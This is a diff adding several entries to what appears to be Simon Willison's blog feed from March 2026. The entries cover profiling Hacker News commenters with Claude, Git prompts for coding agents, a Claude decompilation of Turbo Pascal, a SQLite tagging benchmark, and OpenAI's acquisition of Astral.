+&lt;p&gt;&lt;strong&gt;Personal interests mentioned:&lt;/strong&gt; Niche museums (runs niche-museums.com), New Zealand kākāpō parrots, cooking food from countries he's never visited, chickens in his garden. Lives in Half Moon Bay, CA near a major pelican roost. The pelican-on-a-bicycle SVG test is his signature LLM benchmark.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;In a sentence:&lt;/strong&gt; A deeply experienced, independently-minded developer who's genuinely excited about AI coding tools, fights hard against both uncritical hype and reflexive dismissal, and is trying to professionalize how the industry uses these tools — while also worrying loudly about the security implications almost nobody else takes seriously enough.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This all checks out! I ran this in Claude incognito mode to hopefully prevent Claude from guessing that I was evaluating myself and sycophantically glazing me - the tone of the response it gave here is similar to the tone I've seen against other accounts.&lt;/p&gt;
+
+&lt;p&gt;I expect it guessed my real name due to my habit of linking to my own writing from some of my comments, which provides plenty of simonwillison.net URLs for it to associate with my public persona. I haven't seen it take a guess at a real name for any of the other profiles I've generated.&lt;/p&gt;
+&lt;p&gt;It's a little creepy to be able to derive this much information about someone so easily, even when they've shared that freely in a public (and API-available) place.&lt;/p&gt;
+&lt;p&gt;I mainly use this to check that I'm not getting embroiled in an extensive argument with someone who has a history of arguing in bad faith. Thankfully that's rarely the case - Hacker News continues to be a responsibly moderated online space.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/hacker-news"&gt;hacker-news&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="hacker-news"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-ethics"/></entry><entry><title>Using Git with coding agents</title><link href="https://simonwillison.net/guides/agentic-engineering-patterns/using-git-with-coding-agents/#atom-everything" rel="alternate"/><published>2026-03-21T22:08:24+00:00</published><updated>2026-03-21T22:08:24+00:00</updated><id>https://simonwillison.net/guides/agentic-engineering-patterns/using-git-with-coding-agents/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;em&gt;&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/"&gt;Agentic Engineering Patterns&lt;/a&gt; &amp;gt;&lt;/em&gt;&lt;/p&gt;
+    &lt;p&gt;Git is a key tool for working with coding agents. Keeping code in version control lets us record how that code changes over time and investigate and reverse any mistakes. All of the coding agents are fluent in using Git's features, both basic and advanced.&lt;/p&gt;
+&lt;p&gt;This fluency means we can be more ambitious about how we use Git ourselves. We don't need to  memorize &lt;em&gt;how&lt;/em&gt; to do things with Git, but staying aware of what's possible means we can take advantage of the full suite of Git's abilities.&lt;/p&gt;
+&lt;h2 id="git-essentials"&gt;Git essentials&lt;/h2&gt;
+&lt;p&gt;Each Git project lives in a &lt;strong&gt;repository&lt;/strong&gt; - a folder on disk that can track changes made to the files within it. Those changes are recorded in &lt;strong&gt;commits&lt;/strong&gt; - timestamped bundles of changes to one or more files accompanied by a &lt;strong&gt;commit message&lt;/strong&gt; describing those changes and an &lt;strong&gt;author&lt;/strong&gt; recording who made them.&lt;/p&gt;
+&lt;p&gt;Git supports &lt;strong&gt;branches&lt;/strong&gt;, which allow you to construct and experiment with new changes independently of each other. Branches can then be &lt;strong&gt;merged&lt;/strong&gt; back into your main branch (using various methods) once they are deemed ready.&lt;/p&gt;
+&lt;p&gt;Git repositories can be &lt;strong&gt;cloned&lt;/strong&gt; onto a new machine, and that clone includes both the current files and the full history of changes to them.
+This means developers - or coding agents - can browse and explore that history without any extra network traffic, making history diving effectively free.&lt;/p&gt;
+&lt;p&gt;Git repositories can live just on your own machine,  but Git is designed to support collaboration and backups by publishing them to a &lt;strong&gt;remote&lt;/strong&gt;, which can be public or private. GitHub is the most popular place for these remotes but Git is open source software that enables hosting these remotes on any machine or service that supports the Git protocol.&lt;/p&gt;
+&lt;h2 id="core-concepts-and-prompts"&gt;Core concepts and prompts&lt;/h2&gt;
+&lt;p&gt;Coding agents all have a deep understanding of Git jargon. The following prompts should work with any of them:&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Start a new Git repo here&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+To turn the folder the agent is working in into a Git repository - the agent will probably run the &lt;code&gt;git init&lt;/code&gt; command. If you just say "repo" agents will assume you mean a Git repository.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Commit these changes&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Create a new Git commit to record the changes the agent has made - usually with the &lt;code&gt;git commit -m "commit message"&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Add username/repo as a github remote&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+This should configure your repository for GitHub. You'll need to create a new repo first using &lt;a href="https://github.com/new"&gt;github.com/new&lt;/a&gt;, and configure your machine to talk to GitHub.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Review changes made today&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Or "recent changes" or "last three commits".&lt;/p&gt;
+&lt;p&gt;This is a great way to start a fresh coding agents session. Telling the agent to look at recent changes causes it to run &lt;code&gt;git log&lt;/code&gt;, which can instantly load its context with details of what you have been working on recently - both the modified code and the commit messages that describe it.&lt;/p&gt;
+&lt;p&gt;Seeding the session in this way means you can start talking about that code - suggest additional fixes, ask questions about how it works, or propose the next change that builds on what came before.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Integrate latest changes from main&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Run this on your main branch to fetch other contributions from the remote repository, or run it in a branch to integrate the latest changes on main.&lt;/p&gt;
+&lt;p&gt;There are multiple ways to merge changes, including merge, rebase, squash or fast-forward. If you can't remember the details of these that's fine:
+&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Discuss options for integrating changes from main&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Agents are great at explaining the pros and cons of different merging strategies, and everything in git can always be undone so there's minimal risk in trying new things.
+&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Sort out this git mess for me&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;I use this universal prompt surprisingly often! Here's &lt;a href="https://gisthost.github.io/?2aa2ee2fbd08d272528bbfc3b54a1a7d/page-001.html"&gt;a recent example&lt;/a&gt; where it fixed a cherry-pick for me that failed with a merge conflict.&lt;/p&gt;
+&lt;p&gt;There are plenty of ways you can get into a mess with Git, often through pulls or rebase commands that end in a merge conflict, or just through adding the wrong things to Git's staging environment.&lt;/p&gt;
+&lt;p&gt;Unpicking those used to be the most difficult and time consuming parts of working with Git. No more! Coding agents can navigate the most Byzantine of merge conflicts, reasoning through the intent of the new code and figuring out what to keep and how to combine conflicting changes. If your code has automated tests (and &lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/red-green-tdd/"&gt;it should&lt;/a&gt;) the agent can ensure those pass before finalizing that merge.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Find and recover my code that does ...&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+If you lose code that you are working on that's previously been committed (or saved with &lt;code&gt;git stash&lt;/code&gt;) your agent can probably find it for you. &lt;/p&gt;
+&lt;p&gt;Git has a mechanism called the &lt;code&gt;reflog&lt;/code&gt; which can often capture details of code that hasn't been committed to a permanent branch. Agents can search that, and search other branches too.&lt;/p&gt;
+&lt;p&gt;Just tell them what to find and watch them dive in.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Use git bisect to find when this bug was introduced: ...&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Git bisect is one of the most powerful debugging tools in Git's arsenal, but it has a relatively steep learning curve that often deters developers from using it.&lt;/p&gt;
+&lt;p&gt;When you run a bisect operation you provide Git with some kind of test condition and a start and ending commit range. Git then runs a binary search to identify the earliest commit for which your test condition fails. &lt;/p&gt;
+&lt;p&gt;This can efficiently answer the question "what first caused this bug". The only downside is the need to express the test for the bug in a format that Git bisect can execute.&lt;/p&gt;
+&lt;p&gt;Coding agents can handle this boilerplate for you. This upgrades Git bisect from an occasional use tool to one you can deploy any time you are curious about the historic behavior of your software.&lt;/p&gt;
+&lt;h2 id="rewriting-history"&gt;Rewriting history&lt;/h2&gt;
+&lt;p&gt;Let's get into the fun advanced stuff.&lt;/p&gt;
+&lt;p&gt;The commit history of a Git repository is not fixed. The data is just files on disk after all (tucked away in a hidden &lt;code&gt;.git/&lt;/code&gt; directory), and Git itself provides tools that can be used to modify that history.&lt;/p&gt;
+&lt;p&gt;Don't think of the Git history as a permanent record of what actually happened - instead consider it to be a deliberately authored story that describes the progression of the software project.&lt;/p&gt;
+&lt;p&gt;This story is a tool to aid future development. Permanently recording mistakes and cancelled directions can sometimes be useful, but repository authors can make editorial decisions about what to keep and how best to capture that history.&lt;/p&gt;
+&lt;p&gt;Coding agents are really good at using Git's advanced history rewriting features.&lt;/p&gt;
+&lt;h3 id="undo-or-rewrite-commits"&gt;Undo or rewrite commits&lt;/h3&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Undo last commit&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+It's common to commit code and then regret it - realize that it includes a file you didn't mean to include, for example. The git recipe for this is &lt;code&gt;git reset --soft HEAD~1&lt;/code&gt;. I've never been able to remember that, and now I don't have to!&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Remove uv.lock from that last commit&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+You can also perform more finely grained surgery on commits - rewriting them to remove just a single file, for example.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Combine last three commits with a better commit message&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+Agents can rewrite commit messages and can combine multiple commits into a single unit.&lt;/p&gt;
+&lt;p&gt;I've found that frontier models usually have really good taste in commit messages. I used to insist on writing these myself but I've accepted that the quality they produce is generally good enough, and often even better than what I would have produced myself.&lt;/p&gt;
+&lt;h3 id="building-a-new-repository-from-scraps-of-an-older-one"&gt;Building a new repository from scraps of an older one&lt;/h3&gt;
+&lt;p&gt;A trick I find myself using quite often is extracting out code from a larger repository into a new one while maintaining the key history of that code.&lt;/p&gt;
+&lt;p&gt;One common example is library extraction. I may have built some classes and functions into a project and later realized they would make more sense as a standalone reusable code library.&lt;/p&gt;
+&lt;p&gt;&lt;div&gt;&lt;markdown-copy&gt;&lt;textarea&gt;Start a new repo at /tmp/distance-functions and build a Python library there with the lib/distance_functions.py module from here - build a similar commit history copying the author and commit dates in the new repo&lt;/textarea&gt;&lt;/markdown-copy&gt;&lt;/div&gt;
+This kind of operation used to be involved enough that most developers would create a fresh copy detached from that old commit history. We don't have to settle for that any more!&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github"&gt;github&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/git"&gt;git&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="coding-agents"/><category term="generative-ai"/><category term="github"/><category term="agentic-engineering"/><category term="ai"/><category term="git"/><category term="llms"/></entry><entry><title>Turbo Pascal 3.02A, deconstructed</title><link href="https://simonwillison.net/2026/Mar/20/turbo-pascal/#atom-everything" rel="alternate"/><published>2026-03-20T23:59:14+00:00</published><updated>2026-03-20T23:59:14+00:00</updated><id>https://simonwillison.net/2026/Mar/20/turbo-pascal/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://tools.simonwillison.net/turbo-pascal-deconstructed"&gt;Turbo Pascal 3.02A, deconstructed&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+In &lt;a href="https://prog21.dadgum.com/116.html"&gt;Things That Turbo Pascal is Smaller Than&lt;/a&gt; James Hague lists things (from 2011) that are larger in size than Borland's 1985 Turbo Pascal 3.02 executable - a 39,731 byte file that somehow included a full text editor IDE and Pascal compiler.&lt;/p&gt;
+&lt;p&gt;This inspired me to track down a copy of that executable (available as freeware since 2000) and see if Claude could interpret the binary and decompile it for me.&lt;/p&gt;
+&lt;p&gt;It did a great job, so I had it create &lt;a href="https://tools.simonwillison.net/turbo-pascal-deconstructed"&gt;this interactive artifact&lt;/a&gt; illustrating the result. Here's the &lt;a href="https://claude.ai/share/260d2eed-8d4a-4b9f-8a75-727c3ec4274e"&gt;sequence of prompts&lt;/a&gt; I used (in regular &lt;a href="https://claude.ai/"&gt;claude.ai&lt;/a&gt; chat, not Claude Code):&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Read this https://prog21.dadgum.com/116.html&lt;/p&gt;
+&lt;p&gt;Now find a copy of that binary online&lt;/p&gt;
+&lt;p&gt;Explore this (&lt;em&gt;I attached the zip file&lt;/em&gt;)&lt;/p&gt;
+&lt;p&gt;Build an artifact - no react - that embeds the full turbo.com binary and displays it in a way that helps understand it - broke into labeled segments for different parts of the application, decompiled to visible source code (I guess assembly?) and with that assembly then reconstructed into readable code with extensive annotations&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt="Infographic titled &amp;quot;TURBO.COM&amp;quot; with subtitle &amp;quot;Borland Turbo Pascal 3.02A — September 17, 1986 — Deconstructed&amp;quot; on a dark background. Four statistics are displayed: 39,731 TOTAL BYTES, 17 SEGMENTS MAPPED, 1 INT 21H INSTRUCTION, 100+ BUILT-IN IDENTIFIERS. Below is a &amp;quot;BINARY MEMORY MAP — 0X0100 TO 0X9C33&amp;quot; shown as a horizontal color-coded bar chart with a legend listing 17 segments: COM Header &amp;amp; Copyright, Display Configuration Table, Screen I/O &amp;amp; Video BIOS Routines, Keyboard Input Handler, String Output &amp;amp; Number Formatting, DOS System Call Dispatcher, Runtime Library Core, Error Handler &amp;amp; Runtime Errors, File I/O System, Software Floating-Point Engine, x86 Code Generator, Startup Banner &amp;amp; Main Menu Loop, File Manager &amp;amp; Directory Browser, Compiler Driver &amp;amp; Status, Full-Screen Text Editor, Pascal Parser &amp;amp; Lexer, and Symbol Table &amp;amp; Built-in Identifiers." src="https://static.simonwillison.net/static/2026/turbo-pascal.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Annoyingly the &lt;a href="https://claude.ai/share/260d2eed-8d4a-4b9f-8a75-727c3ec4274e"&gt;Claude share link&lt;/a&gt; doesn't show the actual code that Claude executed, but here's &lt;a href="https://static.simonwillison.net/static/2026/turbo-pascal-analysis.zip"&gt;the zip file&lt;/a&gt; it gave me when I asked to download all of the intermediate files.&lt;/p&gt;
+&lt;p&gt;I ran Codex CLI with GPT-5.4 xhigh against that zip file to see if it would spot any obvious hallucinations, and it did not. This project is low-enough stakes that this gave me enough confidence to publish the result!
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/computer-history"&gt;computer-history&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/tools"&gt;tools&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="computer-history"/><category term="tools"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="claude"/></entry><entry><title>Quoting Kimi.ai @Kimi_Moonshot</title><link href="https://simonwillison.net/2026/Mar/20/cursor-on-kimi/#atom-everything" rel="alternate"/><published>2026-03-20T20:29:23+00:00</published><updated>2026-03-20T20:29:23+00:00</updated><id>https://simonwillison.net/2026/Mar/20/cursor-on-kimi/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://twitter.com/Kimi_Moonshot/status/2035074972943831491"&gt;&lt;p&gt;Congrats to the &lt;a href="https://x.com/cursor_ai"&gt;@cursor_ai&lt;/a&gt; team on the launch of Composer 2!&lt;/p&gt;
+&lt;p&gt;We are proud to see Kimi-k2.5 provide the foundation. Seeing our model integrated effectively through Cursor's continued pretraining &amp;amp; high-compute RL training is the open model ecosystem we love to support.&lt;/p&gt;
+&lt;p&gt;Note: Cursor accesses Kimi-k2.5 via &lt;a href="https://x.com/FireworksAI_HQ"&gt;@FireworksAI_HQ&lt;/a&gt; hosted RL and inference platform as part of an authorized commercial partnership.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://twitter.com/Kimi_Moonshot/status/2035074972943831491"&gt;Kimi.ai @Kimi_Moonshot&lt;/a&gt;, responding to reports that Composer 2 was built on top of Kimi K2.5&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/kimi"&gt;kimi&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/cursor"&gt;cursor&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-in-china"&gt;ai-in-china&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="kimi"/><category term="generative-ai"/><category term="ai"/><category term="cursor"/><category term="llms"/><category term="ai-in-china"/></entry><entry><title>SQLite Tags Benchmark: Comparing 5 Tagging Strategies</title><link href="https://simonwillison.net/2026/Mar/20/sqlite-tags-benchmark/#atom-everything" rel="alternate"/><published>2026-03-20T02:57:00+00:00</published><updated>2026-03-20T02:57:00+00:00</updated><id>https://simonwillison.net/2026/Mar/20/sqlite-tags-benchmark/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Research:&lt;/strong&gt; &lt;a href="https://github.com/simonw/research/tree/main/sqlite-tags-benchmark#readme"&gt;SQLite Tags Benchmark: Comparing 5 Tagging Strategies&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;I had Claude Code run a micro-benchmark comparing different approaches to implementing tagging in SQLite. Traditional many-to-many tables won, but FTS5 came a close second. Full table scans with LIKE queries performed better than I expected, but full table scans with JSON arrays and &lt;code&gt;json_each()&lt;/code&gt; were much slower.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/json"&gt;json&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sqlite"&gt;sqlite&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="json"/><category term="sqlite"/></entry><entry><title>Thoughts on OpenAI acquiring Astral and uv/ruff/ty</title><link href="https://simonwillison.net/2026/Mar/19/openai-acquiring-astral/#atom-everything" rel="alternate"/><published>2026-03-19T16:45:15+00:00</published><updated>2026-03-19T16:45:15+00:00</updated><id>https://simonwillison.net/2026/Mar/19/openai-acquiring-astral/#atom-everything</id><summary type="html">
+    &lt;p&gt;The big news this morning: &lt;a href="https://astral.sh/blog/openai"&gt;Astral to join OpenAI&lt;/a&gt; (on the Astral blog) and &lt;a href="https://openai.com/index/openai-to-acquire-astral/"&gt;OpenAI to acquire Astral&lt;/a&gt; (the OpenAI announcement). Astral are the company behind &lt;a href="https://simonwillison.net/tags/uv/"&gt;uv&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ruff/"&gt;ruff&lt;/a&gt;, and &lt;a href="https://simonwillison.net/tags/ty/"&gt;ty&lt;/a&gt; - three increasingly load-bearing open source projects in the Python ecosystem. I have thoughts!&lt;/p&gt;
+&lt;h4 id="the-official-line-from-openai-and-astral"&gt;The official line from OpenAI and Astral&lt;/h4&gt;
+&lt;p&gt;The Astral team will become part of the Codex team at OpenAI.&lt;/p&gt;
+&lt;p&gt;Charlie Marsh &lt;a href="https://astral.sh/blog/openai"&gt;has this to say&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Open source is at the heart of that impact and the heart of that story; it sits at the center of everything we do. In line with our philosophy and &lt;a href="https://openai.com/index/openai-to-acquire-astral/"&gt;OpenAI's own announcement&lt;/a&gt;, OpenAI will continue supporting our open source tools after the deal closes. We'll keep building in the open, alongside our community -- and for the broader Python ecosystem -- just as we have from the start. [...]&lt;/p&gt;
+&lt;p&gt;After joining the Codex team, we'll continue building our open source tools, explore ways they can work more seamlessly with Codex, and expand our reach to think more broadly about the future of software development.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;OpenAI's message &lt;a href="https://openai.com/index/openai-to-acquire-astral/"&gt;has a slightly different focus&lt;/a&gt; (highlights mine):&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;As part of our developer-first philosophy, after closing OpenAI plans to support Astral’s open source products. &lt;strong&gt;By bringing Astral’s tooling and engineering expertise to OpenAI, we will accelerate our work on Codex&lt;/strong&gt; and expand what AI can do across the software development lifecycle.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is a slightly confusing message. The &lt;a href="https://github.com/openai/codex"&gt;Codex CLI&lt;/a&gt; is a Rust application, and Astral have some of the best Rust engineers in the industry - &lt;a href="https://github.com/burntsushi"&gt;BurntSushi&lt;/a&gt; alone (&lt;a href="https://github.com/rust-lang/regex"&gt;Rust regex&lt;/a&gt;, &lt;a href="https://github.com/BurntSushi/ripgrep"&gt;ripgrep&lt;/a&gt;, &lt;a href="https://github.com/BurntSushi/jiff"&gt;jiff&lt;/a&gt;) may be worth the price of acquisition!&lt;/p&gt;
+&lt;p&gt;So is this about the talent or about the product? I expect both, but I know from past experience that a product+talent acquisition can turn into a talent-only acquisition later on.&lt;/p&gt;
+&lt;h4 id="uv-is-the-big-one"&gt;uv is the big one&lt;/h4&gt;
+&lt;p&gt;Of Astral's projects the most impactful is &lt;a href="https://github.com/astral-sh/uv"&gt;uv&lt;/a&gt;. If you're not familiar with it, &lt;code&gt;uv&lt;/code&gt; is by far the most convincing solution to Python's environment management problems, best illustrated by &lt;a href="https://xkcd.com/1987/"&gt;this classic XKCD&lt;/a&gt;:&lt;/p&gt;
+&lt;p style="text-align: center"&gt;&lt;img src="https://imgs.xkcd.com/comics/python_environment.png" alt="xkcd comic showing a tangled, chaotic flowchart of Python environment paths and installations. Nodes include &amp;quot;PIP&amp;quot;, &amp;quot;EASY_INSTALL&amp;quot;, &amp;quot;$PYTHONPATH&amp;quot;, &amp;quot;ANACONDA PYTHON&amp;quot;, &amp;quot;ANOTHER PIP??&amp;quot;, &amp;quot;HOMEBREW PYTHON (2.7)&amp;quot;, &amp;quot;OS PYTHON&amp;quot;, &amp;quot;HOMEBREW PYTHON (3.6)&amp;quot;, &amp;quot;PYTHON.ORG BINARY (2.6)&amp;quot;, and &amp;quot;(MISC FOLDERS OWNED BY ROOT)&amp;quot; connected by a mess of overlapping arrows. A stick figure with a &amp;quot;?&amp;quot; stands at the top left. Paths at the bottom include &amp;quot;/usr/local/Cellar&amp;quot;, &amp;quot;/usr/local/opt&amp;quot;, &amp;quot;/usr/local/lib/python3.6&amp;quot;, &amp;quot;/usr/local/lib/python2.7&amp;quot;, &amp;quot;/python/&amp;quot;, &amp;quot;/newenv/&amp;quot;, &amp;quot;$PATH&amp;quot;, &amp;quot;????&amp;quot;, and &amp;quot;/(A BUNCH OF PATHS WITH &amp;quot;FRAMEWORKS&amp;quot; IN THEM SOMEWHERE)/&amp;quot;. Caption reads: &amp;quot;MY PYTHON ENVIRONMENT HAS BECOME SO DEGRADED THAT MY LAPTOP HAS BEEN DECLARED A SUPERFUND SITE.&amp;quot;" style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;Switch from &lt;code&gt;python&lt;/code&gt; to &lt;code&gt;uv run&lt;/code&gt; and most of these problems go away. I've been using it extensively for the past couple of years and it's become an essential part of my workflow.&lt;/p&gt;
+&lt;p&gt;I'm not alone in this. According to PyPI Stats &lt;a href="https://pypistats.org/packages/uv"&gt;uv was downloaded&lt;/a&gt; more than 126 million times last month! Since its release in February 2024 - just two years ago - it's become one of the most popular tools for running Python code.&lt;/p&gt;
+&lt;h4 id="ruff-and-ty"&gt;Ruff and ty&lt;/h4&gt;
+&lt;p&gt;Astral's two other big projects are &lt;a href="https://github.com/astral-sh/ruff"&gt;ruff&lt;/a&gt; - a Python linter and formatter - and &lt;a href="https://github.com/astral-sh/ty"&gt;ty&lt;/a&gt; - a fast Python type checker.&lt;/p&gt;
+&lt;p&gt;These are popular tools that provide a great developer experience but they aren't load-bearing in the same way that &lt;code&gt;uv&lt;/code&gt; is.&lt;/p&gt;
+&lt;p&gt;They do however resonate well with coding agent tools like Codex - giving an agent access to fast linting and type checking tools can help improve the quality of the code they generate.&lt;/p&gt;
+&lt;p&gt;I'm not convinced that integrating them &lt;em&gt;into&lt;/em&gt; the coding agent itself as opposed to telling it when to run them will make a meaningful difference, but I may just not be imaginative enough here.&lt;/p&gt;
+&lt;h4 id="what-of-pyx-"&gt;What of pyx?&lt;/h4&gt;
+&lt;p&gt;Ever since &lt;code&gt;uv&lt;/code&gt; started to gain traction the Python community has been worrying about the strategic risk of a single VC-backed company owning a key piece of Python infrastructure. I &lt;a href="https://simonwillison.net/2024/Sep/8/uv-under-discussion-on-mastodon/"&gt;wrote about&lt;/a&gt; one of those conversations in detail back in September 2024.&lt;/p&gt;
+&lt;p&gt;The conversation back then focused on what Astral's business plan could be, which started to take form &lt;a href="https://simonwillison.net/2025/Aug/13/pyx/"&gt;in August 2025&lt;/a&gt; when they announced &lt;a href="https://astral.sh/pyx"&gt;pyx&lt;/a&gt;, their private PyPI-style package registry for organizations.&lt;/p&gt;
+&lt;p&gt;I'm less convinced that pyx makes sense within OpenAI, and it's notably absent from both the Astral and OpenAI announcement posts.&lt;/p&gt;
+&lt;h4 id="competitive-dynamics"&gt;Competitive dynamics&lt;/h4&gt;
+&lt;p&gt;An interesting aspect of this deal is how it might impact the competition between Anthropic and OpenAI.&lt;/p&gt;
+&lt;p&gt;Both companies spent most of 2025 focused on improving the coding ability of their models, resulting in the &lt;a href="https://simonwillison.net/tags/november-2025-inflection/"&gt;November 2025 inflection point&lt;/a&gt; when coding agents went from often-useful to almost-indispensable tools for software development.&lt;/p&gt;
+&lt;p&gt;The competition between Anthropic's Claude Code and OpenAI's Codex is &lt;em&gt;fierce&lt;/em&gt;. Those $200/month subscriptions add up to billions of dollars a year in revenue, for companies that very much need that money.&lt;/p&gt;
+&lt;p&gt;Anthropic &lt;a href="https://www.anthropic.com/news/anthropic-acquires-bun-as-claude-code-reaches-usd1b-milestone"&gt;acquired the Bun JavaScript runtime&lt;/a&gt; in December 2025, an acquisition that looks somewhat similar in shape to Astral.&lt;/p&gt;
+&lt;p&gt;Bun was already a core component of Claude Code and that acquisition looked to mainly be about ensuring that a crucial dependency stayed actively maintained. Claude Code's performance has increased significantly since then thanks to the efforts of Bun's Jarred Sumner.&lt;/p&gt;
+&lt;p&gt;One bad version of this deal would be if OpenAI start using their ownership of &lt;code&gt;uv&lt;/code&gt; as leverage in their competition with Anthropic.&lt;/p&gt;
+&lt;h4 id="astral-s-quiet-series-a-and-b"&gt;Astral's quiet series A and B&lt;/h4&gt;
+&lt;p&gt;One detail that caught my eye from Astral's announcement, in the section thanking the team, investors, and community:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Second, to our investors, especially &lt;a href="https://www.accel.com/team/casey-aylward#bay-area"&gt;Casey Aylward&lt;/a&gt; from Accel, who led our Seed and Series A, and &lt;a href="https://a16z.com/author/jennifer-li/"&gt;Jennifer Li&lt;/a&gt; from Andreessen Horowitz, who led our Series B. As a first-time, technical, solo founder, you showed far more belief in me than I ever showed in myself, and I will never forget that.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;As far as I can tell neither the Series A nor the Series B were previously announced - I've only been able to find coverage of the original seed round &lt;a href="https://astral.sh/blog/announcing-astral-the-company-behind-ruff"&gt;from April 2023&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Those investors presumably now get to exchange their stake in Astral for a piece of OpenAI. I wonder how much influence they had on Astral's decision to sell.&lt;/p&gt;
+&lt;h4 id="forking-as-a-credible-exit-"&gt;Forking as a credible exit?&lt;/h4&gt;
